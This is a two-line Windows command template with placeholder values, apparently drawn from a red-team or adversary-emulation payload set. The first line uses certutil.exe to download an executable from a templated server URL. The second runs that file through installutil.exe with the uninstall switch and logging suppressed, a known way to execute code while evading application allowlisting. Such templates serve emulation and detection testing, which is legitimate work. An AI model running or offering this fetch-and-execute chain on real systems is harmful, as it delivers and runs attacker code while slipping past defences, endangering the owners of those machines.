certutil.exe -urlcache -f {{http_server_url}}/{{filename_exe}} {{filename_exe}}
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U {{filename_exe}}